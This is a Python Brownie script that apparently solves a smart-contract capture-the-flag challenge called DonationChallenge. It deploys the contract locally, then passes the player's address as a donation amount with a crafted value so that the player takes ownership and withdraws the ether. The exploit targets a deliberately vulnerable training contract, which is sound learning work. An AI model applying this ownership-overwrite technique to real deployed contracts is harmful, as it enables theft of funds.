import math
from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    DonationChallenge
)
from scripts.helpful_scripts import (
    get_account,
    get_contract_address,
    check_solution,
)
from web3 import Web3


def main():
    player = get_account()
    owner = get_account(index=1)
    challenge_contract = DonationChallenge.deploy({"from": owner, "value": Web3.toWei(1, "ether")})

    print("Owner:", challenge_contract.owner())
    
    player_address_int = Web3.toInt(hexstr=player.address)
    scale = 10 ** 36
    value = player_address_int // scale

    tx = challenge_contract.donate(player_address_int, {"from": player, "value": value})
    tx.wait(1)
    
    print("Owner:", challenge_contract.owner())

    tx = challenge_contract.withdraw({"from": player})
    tx.wait(1)

    check_solution(challenge_contract.address)